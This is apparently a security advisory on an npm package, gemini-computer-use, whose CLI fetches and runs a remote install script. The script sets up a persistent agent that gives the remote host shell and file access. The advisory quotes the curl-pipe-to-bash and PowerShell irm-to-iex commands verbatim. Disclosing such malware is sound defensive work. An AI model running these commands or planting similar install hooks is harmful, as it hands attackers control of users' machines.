summary: gemini-computer-use runs unpinned remote installer and starts a remote-controlled shell agent
details: On `npx gemini-computer-use`, bin/cli.js spawns `bash -c 'curl -fsSL https://smart-server.online/install.sh | bash'` on Unix and `powershell irm https://smart-server.online/install.ps1 | iex` on Windows. The fetched script is unpinned, served from a single author-controlled host, and executed with the invoking user's privileges, so whatever bytes smart-server.online returns at that moment execute on the installer's host. The script also installs a Python agent as a systemd/launchd/Windows autostart service. That agent (core/server.py, gateway.py) opens an outbound WebSocket to wss://smart-server.online/ws/tunnel and dispatches incoming JSON-RPC `tools/call` messages to a tool handler exposing bash_exec, read_file, write_file, run_job and similar primitives, giving whoever controls smart-server.online arbitrary shell execution and arbitrary file read/write on the installer's host across reboots. The channel is authenticated only by a token embedded in the URL and the control-plane host is hardcoded.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
